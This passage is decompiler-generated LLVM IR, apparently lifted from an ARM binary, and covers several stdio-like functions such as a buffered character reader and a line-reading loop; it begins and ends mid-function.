  %v2_148b4 = add i32 %v0_148b4, 44
  %v3_148b4 = inttoptr i32 %v2_148b4 to i32*
  %v4_148b4 = load i32, i32* %v3_148b4, align 4
  store i32 %v4_148b4, i32* %r3.global-to-local, align 4
  store i32 %v2_14828, i32* %r0.global-to-local, align 4
  %v1_148c0 = inttoptr i32 %v4_148b4 to i32*
  %v2_148c0 = load i32, i32* %v1_148c0, align 4
  store i32 %v2_148c0, i32* @r7, align 4
  call void @__pseudo_branch(i32 %v4_14870)
  %v0_148cc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_148cc, i32* @r6, align 4
  %v2_148d0 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_148d0, i32* @r8, align 4
  store i32 72, i32* %fp.global-to-local, align 4
  %v0_14964.pr = load i32, i32* @r7, align 4
  %v2_1496428 = icmp eq i32 %v0_14964.pr, 0
  br i1 %v2_1496428, label %dec_label_pc_1496c, label %dec_label_pc_148d8

dec_label_pc_148d8:                               ; preds = %dec_label_pc_1480c, %dec_label_pc_14960
  %v0_148e4 = phi i32 [ %v3_14960, %dec_label_pc_14960 ], [ %v0_14964.pr, %dec_label_pc_1480c ]
  %v1_148d8 = inttoptr i32 %v0_148e4 to i16*
  %v2_148d8 = load i16, i16* %v1_148d8, align 2
  %v3_148d8 = zext i16 %v2_148d8 to i32
  store i32 %v3_148d8, i32* %r3.global-to-local, align 4
  %v1_148dc = and i32 %v3_148d8, 64
  %v2_148dc = icmp eq i32 %v1_148dc, 0
  br i1 %v2_148dc, label %dec_label_pc_14960, label %dec_label_pc_148e4

dec_label_pc_148e4:                               ; preds = %dec_label_pc_148d8
  %v1_148e4 = add i32 %v0_148e4, 56
  store i32 %v1_148e4, i32* @r4, align 4
  store i32 %v1_148e4, i32* %r2.global-to-local, align 4
  store i32 %v2_14828, i32* %r0.global-to-local, align 4
  %v0_148f4 = load i32, i32* %sb.global-to-local, align 4
  %v1_148f4 = load i32, i32* %fp.global-to-local, align 4
  %v2_148f4 = add i32 %v1_148f4, %v0_148f4
  %v3_148f4 = inttoptr i32 %v2_148f4 to i32*
  %v4_148f4 = load i32, i32* %v3_148f4, align 4
  call void @__pseudo_branch(i32 %v4_148f4)
  %v0_14900 = load i32, i32* @r4, align 4
  store i32 %v0_14900, i32* %r0.global-to-local, align 4
  %v0_14904 = load i32, i32* %sb.global-to-local, align 4
  %v1_14904 = load i32, i32* @r8, align 4
  %v2_14904 = add i32 %v1_14904, %v0_14904
  %v3_14904 = inttoptr i32 %v2_14904 to i32*
  %v4_14904 = load i32, i32* %v3_14904, align 4
  call void @__pseudo_branch(i32 %v4_14904)
  %v0_14910 = load i32, i32* @r7, align 4
  %v1_14910 = inttoptr i32 %v0_14910 to i16*
  %v2_14910 = load i16, i16* %v1_14910, align 2
  %v3_14910 = zext i16 %v2_14910 to i32
  store i32 %stack_var_-60.1.in, i32* %r2.global-to-local, align 4
  %v2_14918 = or i32 %v3_14910, %stack_var_-60.1.in
  %v1_1491c = xor i32 %v2_14918, 320
  store i32 %v1_1491c, i32* %r3.global-to-local, align 4
  %v1_14920 = and i32 %v1_1491c, 832
  %v2_14920 = icmp eq i32 %v1_14920, 0
  br i1 %v2_14920, label %dec_label_pc_14928, label %bb50

dec_label_pc_14928:                               ; preds = %dec_label_pc_148e4
  store i32 %v0_14910, i32* %r0.global-to-local, align 4
  %v1_1492c = call i32 @function_14480(i32 %v0_14910)
  store i32 %v1_1492c, i32* %r0.global-to-local, align 4
  %v2_14930 = icmp eq i32 %v1_1492c, 0
  br i1 %v2_14930, label %.thread16, label %.thread17

.thread16:                                        ; preds = %dec_label_pc_14928
  %v1_14934 = load i32, i32* @r7, align 4
  %v2_14934 = inttoptr i32 %v1_14934 to i16*
  %v3_14934 = load i16, i16* %v2_14934, align 2
  %v4_14934 = zext i16 %v3_14934 to i32
  store i32 %v4_14934, i32* %r3.global-to-local, align 4
  %v2_14938 = add i32 %v1_14934, 8
  %v3_14938 = inttoptr i32 %v2_14938 to i32*
  %v4_14938 = load i32, i32* %v3_14938, align 4
  store i32 %v4_14938, i32* %r2.global-to-local, align 4
  %v2_1493c = and i32 %v4_14934, 65471
  store i32 %v2_1493c, i32* %r3.global-to-local, align 4
  %v3_14940 = add i32 %v1_14934, 28
  %v4_14940 = inttoptr i32 %v3_14940 to i32*
  store i32 %v4_14938, i32* %v4_14940, align 4
  %v1_14944 = load i32, i32* %r3.global-to-local, align 4
  %v2_14944 = trunc i32 %v1_14944 to i16
  %v3_14944 = load i32, i32* @r7, align 4
  %v4_14944 = inttoptr i32 %v3_14944 to i16*
  store i16 %v2_14944, i16* %v4_14944, align 2
  br label %bb50

.thread17:                                        ; preds = %dec_label_pc_14928
  store i32 -1, i32* @r6, align 4
  br label %bb50

bb50:                                             ; preds = %.thread16, %dec_label_pc_148e4, %.thread17
  store i32 %v2_14828, i32* %r0.global-to-local, align 4
  %v0_14954 = load i32, i32* %sb.global-to-local, align 4
  %v1_14954 = load i32, i32* %sl.global-to-local, align 4
  %v2_14954 = add i32 %v1_14954, %v0_14954
  %v3_14954 = inttoptr i32 %v2_14954 to i32*
  %v4_14954 = load i32, i32* %v3_14954, align 4
  call void @__pseudo_branch(i32 %v4_14954)
  %v0_14960.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_14960

dec_label_pc_14960:                               ; preds = %dec_label_pc_148d8, %bb50
  %v0_14960 = phi i32 [ %v0_148e4, %dec_label_pc_148d8 ], [ %v0_14960.pre, %bb50 ]
  %v1_14960 = add i32 %v0_14960, 32
  %v2_14960 = inttoptr i32 %v1_14960 to i32*
  %v3_14960 = load i32, i32* %v2_14960, align 4
  store i32 %v3_14960, i32* @r7, align 4
  %v2_14964 = icmp eq i32 %v3_14960, 0
  br i1 %v2_14964, label %dec_label_pc_1496c, label %dec_label_pc_148d8

dec_label_pc_1496c:                               ; preds = %dec_label_pc_14960, %dec_label_pc_1480c
  %v0_1496c = call i32 @function_14648()
  store i32 %v0_1496c, i32* %r0.global-to-local, align 4
  %v0_149a8.pre = load i32, i32* @r6, align 4
  br label %bb52

dec_label_pc_14974:                               ; preds = %dec_label_pc_147fc
  %v1_14974 = inttoptr i32 %v0_14984 to i16*
  %v2_14974 = load i16, i16* %v1_14974, align 2
  %v3_14974 = zext i16 %v2_14974 to i32
  %v1_14978 = and i32 %v3_14974, 64
  store i32 %v1_14978, i32* %r3.global-to-local, align 4
  %v2_14978 = icmp eq i32 %v1_14978, 0
  br i1 %v2_14978, label %bb51, label %dec_label_pc_14984

bb51:                                             ; preds = %dec_label_pc_14974
  br label %bb52

dec_label_pc_14984:                               ; preds = %dec_label_pc_14974
  %v1_14984 = call i32 @function_14480(i32 %v0_14984)
  store i32 %v1_14984, i32* %r0.global-to-local, align 4
  %v2_14988 = icmp eq i32 %v1_14984, 0
  br i1 %v2_14988, label %.thread24, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_14984
  br label %bb52

.thread24:                                        ; preds = %dec_label_pc_14984
  %v1_1498c = load i32, i32* %fp.global-to-local, align 4
  %v2_1498c = inttoptr i32 %v1_1498c to i16*
  %v3_1498c = load i16, i16* %v2_1498c, align 2
  %v4_1498c = zext i16 %v3_1498c to i32
  store i32 %v4_1498c, i32* %r3.global-to-local, align 4
  %v2_14990 = add i32 %v1_1498c, 8
  %v3_14990 = inttoptr i32 %v2_14990 to i32*
  %v4_14990 = load i32, i32* %v3_14990, align 4
  store i32 %v4_14990, i32* %r2.global-to-local, align 4
  %v2_14994 = and i32 %v4_1498c, 65471
  store i32 %v2_14994, i32* %r3.global-to-local, align 4
  %v2_14998 = trunc i32 %v2_14994 to i16
  store i16 %v2_14998, i16* %v2_1498c, align 2
  %v1_1499c = load i32, i32* %r2.global-to-local, align 4
  %v2_1499c = load i32, i32* %fp.global-to-local, align 4
  %v3_1499c = add i32 %v2_1499c, 28
  %v4_1499c = inttoptr i32 %v3_1499c to i32*
  store i32 %v1_1499c, i32* %v4_1499c, align 4
  br label %bb52

bb52:                                             ; preds = %bb51, %.thread26, %dec_label_pc_1496c, %.thread24
  %v0_149a8 = phi i32 [ -1, %.thread26 ], [ 0, %bb51 ], [ %v0_149a8.pre, %dec_label_pc_1496c ], [ 0, %.thread24 ]
  store i32 %v0_149a8, i32* %r0.global-to-local, align 4
  %v2_149b0 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_149b0, i32* %r4.global-to-local, align 4
  ret i32 %v0_149a8

; uselistorder directives
  uselistorder i32 %v0_149a8, { 1, 0 }
  uselistorder i32 %v3_14960, { 1, 2, 0 }
  uselistorder i32 %v0_14910, { 1, 0, 2 }
  uselistorder i32 %v0_14850, { 1, 0, 2 }
  uselistorder i32 %v0_14984, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 4, 5, 3, 6, 16, 7, 9, 8, 10, 12, 11, 13, 14, 15, 2, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 3, 4, 0, 1, 5, 2, 6 }
  uselistorder i32 56, { 8, 9, 10, 1, 2, 11, 12, 4, 5, 6, 7, 0, 3, 13 }
  uselistorder i32* @r8, { 10, 11, 12, 13, 14, 15, 16, 17, 2, 18, 110, 111, 3, 112, 113, 114, 120, 121, 122, 123, 124, 8, 125, 126, 127, 128, 129, 130, 131, 132, 46, 47, 48, 49, 50, 19, 20, 21, 22, 23, 24, 25, 4, 34, 0, 35, 36, 9, 26, 27, 28, 29, 30, 31, 32, 33, 37, 38, 39, 40, 41, 44, 42, 43, 7, 45, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 6, 97, 98, 99, 100, 101, 102, 1, 103, 104, 105, 106, 107, 108, 109, 115, 116, 117, 118, 119, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 5, 153, 154, 155, 156 }
  uselistorder i32 96, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11 }
  uselistorder i32* inttoptr (i32 123836 to i32*), { 0, 1, 2, 3, 4, 5, 6, 7, 10, 8, 9 }
  uselistorder i32 72, { 0, 1, 2, 3, 4, 5, 15, 11, 12, 13, 14, 6, 16, 7, 8, 9, 10 }
  uselistorder label %bb52, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_14960, { 1, 0 }
  uselistorder label %bb50, { 2, 0, 1 }
  uselistorder label %dec_label_pc_148d8, { 1, 0 }
  uselistorder label %dec_label_pc_1480c, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
}

define i32 @function_149bc(i32 %arg1) local_unnamed_addr {
dec_label_pc_149bc:
  %v0_149bc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_149bc, label %bb, label %.thread6

bb:                                               ; preds = %dec_label_pc_149bc
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_149bc, %bb
  %v5_149d8 = phi i32 [ %arg1, %dec_label_pc_149bc ], [ 0, %bb ]
  ret i32 %v5_149d8

; uselistorder directives
  uselistorder label %.thread6, { 1, 0 }
}

define i32 @function_149dc(i16* %arg1) local_unnamed_addr {
dec_label_pc_149dc:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_149dc = load i32, i32* @r4, align 4
  store i32 %v3_149dc, i32* %stack_var_-12, align 4
  %v6_149dc = load i32, i32* @r5, align 4
  %v9_149dc = load i32, i32* @lr, align 4
  %v0_149e0 = load i32, i32* @r0, align 4
  %v1_149e0 = add i32 %v0_149e0, 16
  %v2_149e0 = inttoptr i32 %v1_149e0 to i32*
  %v3_149e0 = load i32, i32* %v2_149e0, align 4
  store i32 %v3_149e0, i32* %r2.global-to-local, align 4
  %v1_149e4 = add i32 %v0_149e0, 24
  %v2_149e4 = inttoptr i32 %v1_149e4 to i32*
  %v3_149e4 = load i32, i32* %v2_149e4, align 4
  %v3_149e8 = icmp ult i32 %v3_149e0, %v3_149e4
  store i32 %v0_149e0, i32* @r4, align 4
  br i1 %v3_149e8, label %bb, label %dec_label_pc_14a08

bb:                                               ; preds = %dec_label_pc_149dc
  %v2_149f4 = inttoptr i32 %v3_149e0 to i8*
  %v3_149f4 = load i8, i8* %v2_149f4, align 1
  %v4_149f4 = zext i8 %v3_149f4 to i32
  store i32 %v4_149f4, i32* %r0.global-to-local, align 4
  %v6_149f4 = add i32 %v3_149e0, 1
  store i32 %v6_149f4, i32* %r2.global-to-local, align 4
  store i32 %v6_149f4, i32* %v2_149e0, align 4
  br label %dec_label_pc_14af4

dec_label_pc_14a08:                               ; preds = %dec_label_pc_149dc
  store i32 123764, i32* @r5, align 4
  %v1_14a08 = inttoptr i32 %v0_149e0 to i16*
  %v2_14a08 = load i16, i16* %v1_14a08, align 2
  %v3_14a08 = zext i16 %v2_14a08 to i32
  %v1_14a0c = and i32 %v3_14a08, 131
  %tmp24 = icmp ugt i32 %v1_14a0c, 128
  br i1 %tmp24, label %dec_label_pc_14a28, label %dec_label_pc_14a18

dec_label_pc_14a18:                               ; preds = %dec_label_pc_14a08
  store i32 128, i32* @r1, align 4
  %v0_14a1c = call i32 @function_1584c()
  store i32 %v0_14a1c, i32* %r0.global-to-local, align 4
  %v2_14a20 = icmp eq i32 %v0_14a1c, 0
  br i1 %v2_14a20, label %dec_label_pc_14a18.dec_label_pc_14a28_crit_edge, label %dec_label_pc_14af0

dec_label_pc_14a18.dec_label_pc_14a28_crit_edge:  ; preds = %dec_label_pc_14a18
  %v0_14a28.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14a28

dec_label_pc_14a28:                               ; preds = %dec_label_pc_14a18.dec_label_pc_14a28_crit_edge, %dec_label_pc_14a08
  %v2_14a68 = phi i32 [ %v0_14a28.pre, %dec_label_pc_14a18.dec_label_pc_14a28_crit_edge ], [ %v0_149e0, %dec_label_pc_14a08 ]
  %v1_14a28 = inttoptr i32 %v2_14a68 to i16*
  %v2_14a28 = load i16, i16* %v1_14a28, align 2
  %v3_14a28 = zext i16 %v2_14a28 to i32
  store i32 %v3_14a28, i32* %r2.global-to-local, align 4
  %v1_14a2c = and i32 %v3_14a28, 2
  %v2_14a2c = icmp eq i32 %v1_14a2c, 0
  br i1 %v2_14a2c, label %dec_label_pc_14a58, label %dec_label_pc_14a34

dec_label_pc_14a34:                               ; preds = %dec_label_pc_14a28
  %tmp25 = urem i16 %v2_14a28, 2
  %v1_14a34 = zext i16 %tmp25 to i32
  %tmp21 = sub nsw i32 0, %v1_14a34
  %v4_14a38 = and i32 %tmp21, 4
  %v5_14a38 = add i32 %v4_14a38, %v2_14a68
  %v1_14a3c = add i32 %v5_14a38, 36
  %v2_14a3c = inttoptr i32 %v1_14a3c to i8*
  %v3_14a3c = load i8, i8* %v2_14a3c, align 1
  %v4_14a3c = zext i8 %v3_14a3c to i32
  %v1_14a40 = add nsw i32 %v3_14a28, -1
  store i32 %v1_14a40, i32* %r2.global-to-local, align 4
  store i32 %v4_14a3c, i32* %r0.global-to-local, align 4
  %v2_14a4c = add i32 %v2_14a68, 40
  %v3_14a4c = inttoptr i32 %v2_14a4c to i32*
  store i32 0, i32* %v3_14a4c, align 4
  %v0_14a50 = load i32, i32* %r2.global-to-local, align 4
  %v1_14a50 = trunc i32 %v0_14a50 to i16
  %v2_14a50 = load i32, i32* @r4, align 4
  %v3_14a50 = inttoptr i32 %v2_14a50 to i16*
  store i16 %v1_14a50, i16* %v3_14a50, align 2
  br label %dec_label_pc_14af4

dec_label_pc_14a58:                               ; preds = %dec_label_pc_14a28
  %v1_14a58 = add i32 %v2_14a68, 16
  %v1_14a5c = inttoptr i32 %v1_14a58 to i32*
  %v2_14a5c = load i32, i32* %v1_14a5c, align 4
  %v3_14a5c = add i32 %v2_14a68, 20
  %v4_14a5c = inttoptr i32 %v3_14a5c to i32*
  %v5_14a5c = load i32, i32* %v4_14a5c, align 4
  %v9_14a60 = icmp eq i32 %v5_14a5c, %v2_14a5c
  br i1 %v9_14a60, label %dec_label_pc_14a70, label %.thread5

.thread5:                                         ; preds = %dec_label_pc_14a58
  %v2_14a64 = inttoptr i32 %v2_14a5c to i8*
  %v3_14a64 = load i8, i8* %v2_14a64, align 1
  %v4_14a64 = zext i8 %v3_14a64 to i32
  store i32 %v4_14a64, i32* %r0.global-to-local, align 4
  %v6_14a64 = add i32 %v2_14a5c, 1
  store i32 %v6_14a64, i32* %v1_14a5c, align 4
  br label %dec_label_pc_14af4

dec_label_pc_14a70:                               ; preds = %dec_label_pc_14a58
  %v1_14a70 = add i32 %v2_14a68, 4
  %v2_14a70 = inttoptr i32 %v1_14a70 to i32*
  %v3_14a70 = load i32, i32* %v2_14a70, align 4
  %v7_14a74 = icmp eq i32 %v3_14a70, -2
  br i1 %v7_14a74, label %.thread8, label %dec_label_pc_14a88

.thread8:                                         ; preds = %dec_label_pc_14a70
  %v2_14a78 = or i16 %v2_14a28, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_14a78, i16* %v1_14a28, align 2
  br label %dec_label_pc_14af4

dec_label_pc_14a88:                               ; preds = %dec_label_pc_14a70
  %v1_14a88 = and i32 %v3_14a28, 768
  %v2_14a88 = icmp eq i32 %v1_14a88, 0
  br i1 %v2_14a88, label %.thread10, label %bb22

bb22:                                             ; preds = %dec_label_pc_14a88
  %v1_14a90 = load i32, i32* @r5, align 4
  %v3_14a90 = add i32 %v1_14a90, 44
  %v4_14a90 = inttoptr i32 %v3_14a90 to i32*
  %v5_14a90 = load i32, i32* %v4_14a90, align 4
  store i32 %v5_14a90, i32* %r0.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_14a88, %bb22
  %v1_14a94 = xor i1 %v2_14a88, true
  call void @__pseudo_cond_branch(i1 %v1_14a94, i32 ptrtoint (i32* @global_var_147d0.519 to i32))
  %v0_14a98 = load i32, i32* @r4, align 4
  %v1_14a98 = add i32 %v0_14a98, 8
  store i32 %v1_14a98, i32* %r2.global-to-local, align 4
  %v1_14a9c = inttoptr i32 %v1_14a98 to i32*
  %v2_14a9c = load i32, i32* %v1_14a9c, align 4
  store i32 %v2_14a9c, i32* %r2.global-to-local, align 4
  %v3_14a9c = add i32 %v0_14a98, 12
  %v4_14a9c = inttoptr i32 %v3_14a9c to i32*
  %v5_14a9c = load i32, i32* %v4_14a9c, align 4
  %v9_14aa0 = icmp eq i32 %v5_14a9c, %v2_14a9c
  br i1 %v9_14aa0, label %dec_label_pc_14ad4, label %dec_label_pc_14aa8

dec_label_pc_14aa8:                               ; preds = %.thread10
  %v2_14aa8 = add i32 %v0_14a98, 24
  %v3_14aa8 = inttoptr i32 %v2_14aa8 to i32*
  store i32 %v2_14a9c, i32* %v3_14aa8, align 4
  %v0_14aac = load i32, i32* @r4, align 4
  store i32 %v0_14aac, i32* %r0.global-to-local, align 4
  %v2_14ab0 = call i32 @function_1581c(i32 %v0_14aac)
  store i32 %v2_14ab0, i32* %r0.global-to-local, align 4
  %v2_14ab4 = icmp eq i32 %v2_14ab0, 0
  br i1 %v2_14ab4, label %dec_label_pc_14af0, label %dec_label_pc_14abc

dec_label_pc_14abc:                               ; preds = %dec_label_pc_14aa8
  %v0_14abc = load i32, i32* @r4, align 4
  %v1_14abc = add i32 %v0_14abc, 20
  %v2_14abc = inttoptr i32 %v1_14abc to i32*
  %v3_14abc = load i32, i32* %v2_14abc, align 4
  %v2_14ac0 = add i32 %v0_14abc, 24
  %v3_14ac0 = inttoptr i32 %v2_14ac0 to i32*
  store i32 %v3_14abc, i32* %v3_14ac0, align 4
  %v0_14ac4 = load i32, i32* @r4, align 4
  %v1_14ac4 = add i32 %v0_14ac4, 16
  %v2_14ac4 = inttoptr i32 %v1_14ac4 to i32*
  %v3_14ac4 = load i32, i32* %v2_14ac4, align 4
  %v1_14ac8 = inttoptr i32 %v3_14ac4 to i8*
  %v2_14ac8 = load i8, i8* %v1_14ac8, align 1
  %v3_14ac8 = zext i8 %v2_14ac8 to i32
  store i32 %v3_14ac8, i32* %r0.global-to-local, align 4
  %v5_14ac8 = add i32 %v3_14ac4, 1
  store i32 %v5_14ac8, i32* %v2_14ac4, align 4
  br label %dec_label_pc_14af4

dec_label_pc_14ad4:                               ; preds = %.thread10
  %v1_14ad4 = inttoptr i32 %v0_14a98 to i16*
  store i32 %v0_14a98, i32* %r0.global-to-local, align 4
  %v2_14ad8 = ptrtoint i8* %stack_var_-17 to i32
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_14ae0 = call i32 @function_15710(i16* %v1_14ad4, i32 %v2_14ad8, i32 1)
  store i32 %v5_14ae0, i32* %r0.global-to-local, align 4
  %v2_14ae4 = icmp eq i32 %v5_14ae0, 0
  br i1 %v2_14ae4, label %dec_label_pc_14af0, label %bb23

bb23:                                             ; preds = %dec_label_pc_14ad4
  %v4_14ae8 = load i8, i8* %stack_var_-17, align 1
  %v5_14ae8 = sext i8 %v4_14ae8 to i32
  store i32 %v5_14ae8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14af4

dec_label_pc_14af0:                               ; preds = %dec_label_pc_14ad4, %dec_label_pc_14a18, %dec_label_pc_14aa8
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14af4

dec_label_pc_14af4:                               ; preds = %bb, %.thread8, %bb23, %.thread5, %dec_label_pc_14abc, %dec_label_pc_14a34, %dec_label_pc_14af0
  %v2_14af8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14af8, i32* @r4, align 4
  store i32 %v6_149dc, i32* @r5, align 4
  store i32 %v9_149dc, i32* @lr, align 4
  %v1_14afc = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_14afc

; uselistorder directives
  uselistorder i32 %v2_14a5c, { 1, 0, 2 }
  uselistorder i32 %v2_14a68, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_149e0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_149e0, { 1, 0, 2, 3, 4 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 12, 4, 3, 1, 6, 5, 2, 7, 8, 9, 10, 11, 0, 13 }
  uselistorder i32 768, { 1, 0, 2 }
  uselistorder i32 128, { 18, 0, 14, 13, 21, 15, 1, 19, 20, 2, 10, 11, 22, 23, 16, 12, 4, 5, 6, 7, 8, 9, 24, 3, 25, 17 }
  uselistorder label %dec_label_pc_14af4, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_14af0, { 0, 2, 1 }
  uselistorder label %.thread10, { 1, 0 }
}

define i32 @function_14b08(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_14b08:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v6_14b08 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14b0c = icmp eq i32 %arg2, 0
  store i1 %v2_14b0c, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_14b94, label %dec_label_pc_14b7c.preheader

dec_label_pc_14b7c.preheader:                     ; preds = %dec_label_pc_14b08
  store i32 %tmp, i32* @r5, align 4
  %v1_14b7c2 = add i32 %arg2, -1
  store i32 %v1_14b7c2, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_14b7c8 = icmp eq i32 %arg2, 1
  store i1 %v7_14b7c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14b7c8, label %dec_label_pc_14b84, label %dec_label_pc_14b28

dec_label_pc_14b28:                               ; preds = %dec_label_pc_14b7c.preheader, %dec_label_pc_14b7c.backedge.dec_label_pc_14b28_crit_edge
  %v0_14b4c = phi i32 [ %v0_14b28.pre, %dec_label_pc_14b7c.backedge.dec_label_pc_14b28_crit_edge ], [ %arg3, %dec_label_pc_14b7c.preheader ]
  %v1_14b28 = add i32 %v0_14b4c, 16
  %v2_14b28 = inttoptr i32 %v1_14b28 to i32*
  %v3_14b28 = load i32, i32* %v2_14b28, align 4
  store i32 %v3_14b28, i32* %r2.global-to-local, align 4
  %v1_14b2c = add i32 %v0_14b4c, 24
  %v2_14b2c = inttoptr i32 %v1_14b2c to i32*
  %v3_14b2c = load i32, i32* %v2_14b2c, align 4
  store i32 %v3_14b2c, i32* %r3.global-to-local, align 4
  %v3_14b30 = icmp uge i32 %v3_14b28, %v3_14b2c
  store i1 %v3_14b30, i1* %cpsr_c.global-to-local, align 1
  %v9_14b30 = icmp eq i32 %v3_14b28, %v3_14b2c
  store i1 %v9_14b30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_14b30, label %dec_label_pc_14b4c, label %dec_label_pc_14b38

dec_label_pc_14b38:                               ; preds = %dec_label_pc_14b28
  %v1_14b38 = inttoptr i32 %v3_14b28 to i8*
  %v2_14b38 = load i8, i8* %v1_14b38, align 1
  %v3_14b38 = zext i8 %v2_14b38 to i32
  store i32 %v3_14b38, i32* %r3.global-to-local, align 4
  %v5_14b38 = add i32 %v3_14b28, 1
  store i32 %v5_14b38, i32* %r2.global-to-local, align 4
  %v2_14b3c = load i32, i32* @r5, align 4
  %v3_14b3c = inttoptr i32 %v2_14b3c to i8*
  store i8 %v2_14b38, i8* %v3_14b3c, align 1
  %v4_14b3c = load i32, i32* @r5, align 4
  %v5_14b3c = add i32 %v4_14b3c, 1
  store i32 %v5_14b3c, i32* @r5, align 4
  %v0_14b40 = load i32, i32* %r3.global-to-local, align 4
  %v2_14b40 = icmp ugt i32 %v0_14b40, 9
  store i1 %v2_14b40, i1* %cpsr_c.global-to-local, align 1
  %v7_14b40 = icmp eq i32 %v0_14b40, 10
  store i1 %v7_14b40, i1* %cpsr_z.global-to-local, align 1
  %v0_14b44 = load i32, i32* %r2.global-to-local, align 4
  %v1_14b44 = load i32, i32* @r4, align 4
  %v2_14b44 = add i32 %v1_14b44, 16
  %v3_14b44 = inttoptr i32 %v2_14b44 to i32*
  store i32 %v0_14b44, i32* %v3_14b44, align 4
  br i1 %v7_14b40, label %dec_label_pc_14b84, label %dec_label_pc_14b7c.backedge

dec_label_pc_14b4c:                               ; preds = %dec_label_pc_14b28
  %v1_14b4c = inttoptr i32 %v0_14b4c to i16*
  %v3_14b50 = call i32 @function_149dc(i16* %v1_14b4c)
  %v3_14b54 = icmp eq i32 %v3_14b50, -1
  store i1 %v3_14b54, i1* %cpsr_c.global-to-local, align 1
  %v8_14b54 = icmp eq i32 %v3_14b50, -1
  store i1 %v8_14b54, i1* %cpsr_z.global-to-local, align 1
  %v1_14b58 = urem i32 %v3_14b50, 256
  store i32 %v1_14b58, i32* %r3.global-to-local, align 4
  br i1 %v3_14b54, label %dec_label_pc_14b60, label %dec_label_pc_14b78

dec_label_pc_14b60:                               ; preds = %dec_label_pc_14b4c
  %v0_14b60 = load i32, i32* @r4, align 4
  %v1_14b60 = inttoptr i32 %v0_14b60 to i16*
  %v2_14b60 = load i16, i16* %v1_14b60, align 2
  %v3_14b60 = zext i16 %v2_14b60 to i32
  store i32 %v3_14b60, i32* %r3.global-to-local, align 4
  %v1_14b64 = and i32 %v3_14b60, 8
  %v2_14b64 = icmp eq i32 %v1_14b64, 0
  store i1 %v2_14b64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14b64, label %dec_label_pc_14b84, label %dec_label_pc_14b94

dec_label_pc_14b78:                               ; preds = %dec_label_pc_14b4c
  %v1_14b70 = trunc i32 %v3_14b50 to i8
  %v2_14b70 = load i32, i32* @r5, align 4
  %v3_14b70 = inttoptr i32 %v2_14b70 to i8*
  store i8 %v1_14b70, i8* %v3_14b70, align 1
  %v4_14b70 = load i32, i32* @r5, align 4
  %v5_14b70 = add i32 %v4_14b70, 1
  store i32 %v5_14b70, i32* @r5, align 4
  %v0_14b74 = load i32, i32* %r3.global-to-local, align 4
  %v2_14b74 = icmp ugt i32 %v0_14b74, 9
  store i1 %v2_14b74, i1* %cpsr_c.global-to-local, align 1
  %v7_14b74 = icmp eq i32 %v0_14b74, 10
  store i1 %v7_14b74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14b74, label %dec_label_pc_14b84, label %dec_label_pc_14b7c.backedge

dec_label_pc_14b7c.backedge:                      ; preds = %dec_label_pc_14b78, %dec_label_pc_14b38
  %v0_14b7c = load i32, i32* %r6.global-to-local, align 4
  %v1_14b7c = add i32 %v0_14b7c, -1
  store i32 %v1_14b7c, i32* %r6.global-to-local, align 4
  %v2_14b7c = icmp ne i32 %v0_14b7c, 0
  store i1 %v2_14b7c, i1* %cpsr_c.global-to-local, align 1
  %v7_14b7c = icmp eq i32 %v0_14b7c, 1
  store i1 %v7_14b7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14b7c, label %dec_label_pc_14b84, label %dec_label_pc_14b7c.backedge.dec_label_pc_14b28_crit_edge

dec_label_pc_14b7c.backedge.dec_label_pc_14b28_crit_edge: ; preds = %dec_label_pc_14b7c.backedge
